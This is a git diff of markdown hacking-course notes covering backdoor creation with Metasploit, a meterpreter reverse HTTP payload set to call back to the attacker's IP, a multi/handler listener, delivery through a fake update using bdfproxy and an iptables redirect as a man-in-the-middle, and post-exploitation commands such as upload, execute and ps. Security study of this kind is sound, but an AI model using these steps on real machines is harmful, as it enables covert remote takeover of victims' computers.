@@ -232,6 +232,7 @@ A backdoor is a file that gives full access over the machine that it gets execut
 * See available payloads
   * `list`
 * Use a playload
+  * use a `meterpreter/rev_http` payload
   * `use [payload number]`
 * Configure the backdoor, set Lhost to your IP
   * `set [option] [value]`
@@ -248,7 +249,7 @@ Check if your backdoor is being detected by anti-virus by going to
   * `msfconsole`
   * `use exploit/multi/handler`
   * `show options`
-  * Set the correct the correct payload, Lhost and Lport, and then exploit.
+  * Set the correct the correct payload path, Lhost and Lport to your IP and the port to the port that your backdoor uses, and then exploit.
 
 ### Deliver the backdoor by a fake update
 
@@ -280,7 +281,7 @@ We need to be in the middle of the connection.
   * ` nano /etc/bdfproxy/bdfproxy.cfg`
 * Start bdfproxy
   * `bdfproxy`
-* Redirect traffic to bdfoxy (the proxy is running un port 8080)
+* Redirect traffic to bdfoxy (the proxy is running on port 8080)
   * `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`
 * Become the MITM
 * Start listening for connections
@@ -372,7 +373,7 @@ have full control over the computer, everything can be done.
   * `upload [file]`
 * Execute file
   * `execute [file]`
-*List processes
+* List processes
   * `ps`
 
 ### Migrate Process
